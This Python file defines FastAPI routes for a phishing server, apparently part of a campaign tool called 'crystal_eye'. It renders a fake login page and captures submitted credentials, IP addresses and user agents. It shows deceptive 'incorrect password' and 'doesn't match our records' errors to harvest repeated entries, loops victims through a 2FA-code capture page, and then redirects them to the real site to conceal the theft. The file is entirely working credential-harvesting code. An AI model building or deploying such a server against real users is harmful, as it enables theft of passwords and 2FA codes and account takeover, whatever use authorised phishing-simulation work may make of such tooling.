from __future__ import annotations

from fastapi import FastAPI, Request, Response
from fastapi.responses import HTMLResponse, RedirectResponse

from crystal_eye.db.models import Credential


def register_routes(app: FastAPI) -> None:

    @app.get("/", response_class=HTMLResponse)
    async def login_page(request: Request):
        loader = request.app.state.loader
        html = loader.render_login(post_url="/login")
        return HTMLResponse(content=html)

    @app.post("/login")
    async def capture_credentials(request: Request):
        form_data = await request.form()
        manifest = request.app.state.manifest
        config = request.app.state.config
        on_credential = request.app.state.on_credential
        tracker = request.app.state.attempt_tracker

        client_ip = request.client.host if request.client else "unknown"
        user_agent = request.headers.get("user-agent", "")

        fields = {}
        for field_def in manifest.fields:
            value = form_data.get(field_def.name, "")
            fields[field_def.name] = str(value)

        credential = Credential(
            campaign_id=config._active_campaign_id or 0,
            template=config.template or "",
            fields=fields,
            source_ip=client_ip,
            user_agent=user_agent,
        )
        on_credential(credential)

        max_attempts = config.max_attempts
        redirect_url = config.redirect_url or manifest.redirect_url

        if config.enable_2fa:
            # With 2FA: always go to 2FA page after login submission.
            # The 2FA handler decides whether to loop back or redirect.
            tracker_key = client_ip
            current_round = tracker.get(tracker_key, 0) + 1
            tracker[tracker_key] = current_round

            loader = request.app.state.loader
            html = loader.render_2fa(post_url="/2fa")
            return HTMLResponse(content=html)

        # Without 2FA: use attempt tracking for error → redirect flow
        tracker_key = client_ip
        current_attempt = tracker.get(tracker_key, 0) + 1
        tracker[tracker_key] = current_attempt

        if current_attempt >= max_attempts:
            tracker.pop(tracker_key, None)
            return RedirectResponse(url=redirect_url, status_code=303)

        loader = request.app.state.loader
        html = loader.render_error(
            post_url="/login",
            error_message="The password that you've entered is incorrect. Please try again.",
        )
        return HTMLResponse(content=html)

    @app.post("/2fa")
    async def capture_2fa_code(request: Request):
        form_data = await request.form()
        config = request.app.state.config
        manifest = request.app.state.manifest
        on_credential = request.app.state.on_credential
        tracker = request.app.state.attempt_tracker

        client_ip = request.client.host if request.client else "unknown"
        user_agent = request.headers.get("user-agent", "")

        code = str(form_data.get("code", ""))

        credential = Credential(
            campaign_id=config._active_campaign_id or 0,
            template=config.template or "",
            fields={"2fa_code": code},
            source_ip=client_ip,
            user_agent=user_agent,
        )
        on_credential(credential)

        redirect_url = config.redirect_url or manifest.redirect_url
        max_attempts = config.max_attempts
        tracker_key = client_ip
        current_round = tracker.get(tracker_key, 0)

        if current_round >= max_attempts:
            # Final round — redirect to real site
            tracker.pop(tracker_key, None)
            return RedirectResponse(url=redirect_url, status_code=303)

        # Not the last round — show error, send back to login
        loader = request.app.state.loader
        html = loader.render_error(
            post_url="/login",
            error_message="The information that you've entered doesn't match our records. Please try again.",
        )
        return HTMLResponse(content=html)

    @app.get("/favicon.ico")
    async def favicon():
        return Response(status_code=204)
